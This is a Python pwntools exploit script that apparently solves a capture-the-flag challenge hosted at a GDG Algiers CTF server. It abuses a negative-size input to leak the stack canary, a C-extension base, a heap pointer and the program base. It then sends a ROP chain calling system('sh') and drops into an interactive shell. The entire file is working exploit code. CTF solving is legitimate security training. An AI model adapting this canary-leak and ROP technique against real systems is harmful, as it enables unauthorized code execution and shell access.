#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

# shortcuts
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

exe = ELF('./python3.10')

host, port = "pwn.chal.ctf.gdgalgiers.com", "1403"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)

# size pass as negative number and conversion to bytes in python with cb = CBytes(size) , permits to pass size > 0x50
# so we leak canary first
sla('size: ', '-167')
sa('bytes: ', 'A'*0x59)
p.recvuntil('A'*0x59,drop=True)
canary = u64(b'\x00'+p.recv(7))
print('canary = '+hex(canary))
sla('[y/n] ', 'n')
sa('bytes: ', 'A'*0x58+b'\x00')
sla('[y/n] ', 'y')

# then we leak .bss value of cext (needed for not crashing)
sla('Choice: ', '1')
sla('size: ', '-152')
sa('bytes: ', 'A'*0x68)
p.recvuntil('A'*0x68,drop=True)
cext = u64(p.recvuntil('\n',drop=True).ljust(8,b'\x00')) - 0x21530
print('cext base = '+hex(cext))
sla('[y/n] ', 'n')
payload = 'A'*0x58+p64(canary)+p64(0)
sa('bytes: ', payload)
sla('[y/n] ', 'y')

# we leak the heap values too
sla('Choice: ', '1')
sla('size: ', '-144')
sa('bytes: ', 'A'*0x70)
p.recvuntil('A'*0x70,drop=True)
heap = u64(p.recvuntil('\n',drop=True).ljust(8,b'\x00'))
print('heap = '+hex(heap))
sla('[y/n] ', 'n')
payload = 'A'*0x58+p64(canary)+p64(0)+p64(cext+0x21530)
sa('bytes: ', payload)
sla('[y/n] ', 'y')

# now we leak return address, to calculate exe base
sla('Choice: ', '1')
sla('size: ', '-104')
sa('bytes: ', 'A'*0x98)
p.recvuntil('A'*0x98,drop=True)
leak = u64(p.recvuntil('\n',drop=True).ljust(8,b'\x00'))
print('leak = '+hex(leak))
exe.address = leak - 0x1846b8
print('prog base = '+hex(exe.address))
sla('[y/n] ', 'n')
payload = 'A'*0x58+p64(canary)+p64(0)+p64(cext+0x21530)+p64(heap)*2 + p64(cext+0x21530)+p64(0)*2
sa('bytes: ', payload)
sla('[y/n] ', 'y')

# then we send a rop that execute system('sh')
sla('Choice: ', '1')
sla('size: ', '-72')
rop = ROP(exe)
ret = rop.find_gadget(['ret'])[0]
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
payload = 'A'*0x58+p64(canary)+p64(0)+p64(cext+0x21530)+p64(heap)*2 + p64(cext+0x21530)+p64(0)*2
payload += p64(ret)+p64(pop_rdi)+p64(exe.address+0x310abf)+p64(exe.sym['system'])
sa('bytes: ', payload)
sla('[y/n] ', 'y')

p.interactive()

